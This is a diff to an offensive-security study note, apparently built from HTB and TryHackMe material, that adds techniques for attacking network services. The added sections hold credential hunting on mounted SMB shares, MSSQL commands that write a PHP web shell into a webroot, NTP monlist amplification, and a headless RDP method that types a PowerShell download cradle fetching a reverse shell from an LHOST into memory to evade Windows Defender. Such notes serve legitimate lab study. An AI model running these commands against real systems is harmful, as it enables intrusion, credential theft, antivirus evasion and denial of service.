@@ -4,7 +4,7 @@ type: technique
 tags: [dns, enumeration, exploitation, htb, network, rdp, smb, thm]
 phase: exploitation
 date_created: 2026-05-08
-date_updated: 2026-07-15
+date_updated: 2026-09-10
 sources: [cpts-common-services, thm-linux-smb, thm-linux-services, thm-linux-pop3, hacktricks-network]
 ---
 
@@ -167,6 +167,36 @@ A real-world example from the Skynet THM room demonstrates the chaining approach
 | CVE-2020-0796 | SMBGhost | SMBv3.1.1 compression — integer overflow in SMB driver allowing unauthenticated RCE on Windows 10 1903/1909 |
 | CVE-2017-0144 | EternalBlue | SMBv1 buffer overflow enabling unauthenticated RCE; basis of WannaCry/NotPetya (historical but still relevant) |
 
+### Post-Access Share Looting (Linux File Share Interaction)
+
+Once share access (or a foothold) exists, mount the share and mine it for credentials on both platforms:
+
+```sh
+# Mount SMB share on Linux
+sudo apt install cifs-utils
+sudo mkdir /mnt/share
+sudo mount -t cifs //<IP>/<share> /mnt/share -o username=<user>,password=<pass>
+sudo mount -t cifs //<IP>/<share> /mnt/share -o credentials=/path/credfile
+# credfile format: username=user / password=pass / domain=. (one key per line)
+
+# Hunt credentials in the mounted share
+find /mnt/share/ -name "*cred*" -o -name "*password*" -o -name "*.conf"
+grep -rn "password" /mnt/share/ --include="*.txt" --include="*.conf"
+```
+
+```powershell
+# Windows CMD
+net use n: \\<IP>\<share> /user:<user> <pass>
+dir n:\*cred* /s /b
+findstr /s /i cred n:\*.*
+
+# Windows PowerShell
+$cred = New-Object System.Management.Automation.PSCredential('<user>', (ConvertTo-SecureString '<pass>' -AsPlainText -Force))
+New-PSDrive -Name "N" -Root "\\<IP>\<share>" -PSProvider "FileSystem" -Credential $cred
+Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
+Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
+```
+
 ---
 
 ## SQL Databases — MySQL (3306) / MSSQL (1433/1434/2433)
@@ -308,6 +338,27 @@ GO
 
 ```sql
 SELECT LOAD_FILE("/etc/passwd");
+```
+
+### MSSQL — Write File (Ole Automation)
+
+```sql
+sp_configure 'show advanced options', 1
+GO
+RECONFIGURE
+GO
+sp_configure 'Ole Automation Procedures', 1
+GO
+RECONFIGURE
+GO
+DECLARE @OLE INT
+DECLARE @FileID INT
+EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\shell.php', 8, 1
+EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+EXECUTE sp_OADestroy @FileID
+EXECUTE sp_OADestroy @OLE
+GO
 ```
 
 ### Notable SQL CVEs
@@ -589,6 +640,11 @@ snmpwalk -v2c -c public <IP>
 snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.1    # System info
 snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4  # Running processes
 snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.6  # Installed software
+snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.4.34  # IPv6 addresses
+snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.77.1.2.25  # Windows users
+
+# SNMPv3 walk (requires credentials)
+snmpwalk -v3 -l authPriv -u <user> -a SHA -A <auth_pass> -x AES -X <priv_pass> <IP>
 ```
 
 ### SNMP Write Abuse (private community)
@@ -598,6 +654,36 @@ If the `private` community string is known and the device allows SNMP sets, an a
 ```sh
 snmpset -v2c -c private <IP> <OID> <type> <value>
 ```
+
+---
+
+## NTP 123/udp enumeration and monlist amplification
+
+NTP leaks system/peer info via control queries and, on legacy daemons, the Mode-7
+`monlist` command returns up to 600 recent client addresses. `monlist` is both a recon
+goldmine (internal hosts) and a ~200x reflection/amplification DDoS primitive.
+
+```bash
+# Control queries (ntpd)
+ntpq -c rv <IP>
+ntpq -c peers <IP>
+ntpq -c associations <IP>
+
+# Legacy Mode-7 (often disabled on ntpd >= 4.2.8p9)
+ntpdc -c monlist <IP>
+ntpdc -c sysinfo <IP>
+
+# chrony (modern distros; only if cmdallow)
+chronyc -a -n -h <IP> sources -v
+
+# Nmap
+nmap -sU -sV --script "ntp* and (discovery or vuln) and not (dos or brute)" -p 123 <IP>
+nmap -sU -p123 --script ntp-monlist <IP>
+```
+
+Config to check post-access: `/etc/ntp.conf`, `/etc/chrony/chrony.conf` (look for
+`restrict`, `disable monitor`, NTS). Recent OOB-write CVEs: CVE-2023-26551..26555 (fixed
+in ntp 4.2.8p16).
 
 ---
 
@@ -755,6 +841,31 @@ Invoke-MSRPCFuzzer -Pipe "\\.\pipe\efsrpc" -Auth NTLM -MinLen 1 -MaxLen 0x400 `
 Run only in an isolated VM snapshot; the fuzzer causes service crashes and BSODs.
 
 ---
+
+## Headless RDP foothold when RDP is the ONLY exec (no WinRM, not admin)
+
+A valid Windows user who is NOT in Remote Management Users (WinRM denied) and NOT a local admin
+(no psexec/smbexec) can still often log on over RDP. Drive RDP headlessly from Linux and immediately
+trade the GUI for a scriptable in-memory shell:
+
+```sh
+# 1. headless X + connect (3.x needs /cert:ignore)
+Xvfb :99 -screen 0 1280x800x24 &
+DISPLAY=:99 xfreerdp3 /v:TARGET /u:USER /p:PASS /cert:ignore /size:1280x800 +clipboard
+# 2. drive the desktop: Win+R, type a download-cradle, Enter (screenshot with `import -window root` to verify)
+DISPLAY=:99 xdotool key super+r
+DISPLAY=:99 xdotool type "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://LHOST:8000/shell.ps1')"
+DISPLAY=:99 xdotool key Return
+```
+
+The cradle pulls the reverse shell **in memory** (`DownloadString`+`IEX`), so nothing touches disk and
+Windows Defender's on-write scan never fires; it is the reliable delivery when a dropped `.exe`
+(msfvenom/RunasCs) gets quarantined. Verify the RDP state by grabbing the framebuffer
+(`DISPLAY=:99 import -window root out.png`) rather than typing blind. Gotchas: a forced
+"change password at next logon" blocks RDP; a stale `/etc/krb5.conf` realm makes xfreerdp waste time
+on Kerberos before NTLM fallback; reconnecting to an existing session ignores a new `/drive:` mount.
+
+<!-- promoted-slug: headless-rdp-foothold-no-winrm -->
 
 ## RDP session shadowing (view or control another user's session)
 
@@ -2810,6 +2921,31 @@ No specific CVE for the protocol; the two abuse classes are design-level: first-
 | crowbar | RDP password spray |
 | xfreerdp | RDP client with PtH support |
 | medusa | Multi-protocol brute force (FTP, SSH, SMB, etc.) |
+
+### Service Port Reference
+
+| Port | Protocol | Service |
+|------|----------|---------|
+| 21 | TCP | FTP |
+| 22 | TCP | SSH |
+| 25 | TCP | SMTP (unencrypted) |
+| 53 | UDP/TCP | DNS |
+| 80 | TCP | HTTP |
+| 110 | TCP | POP3 (unencrypted) |
+| 139 | TCP | SMB (NetBIOS) |
+| 143 | TCP | IMAP (unencrypted) |
+| 161 | UDP | SNMP |
+| 443 | TCP | HTTPS |
+| 445 | TCP | SMB (direct) |
+| 465 | TCP | SMTPS |
+| 587 | TCP | SMTP/STARTTLS |
+| 993 | TCP | IMAPS |
+| 995 | TCP | POP3S |
+| 1433 | TCP | MSSQL |
+| 1434 | UDP | MSSQL Browser |
+| 2433 | TCP | MSSQL (hidden mode) |
+| 3306 | TCP | MySQL |
+| 3389 | TCP | RDP |
 
 ---
 
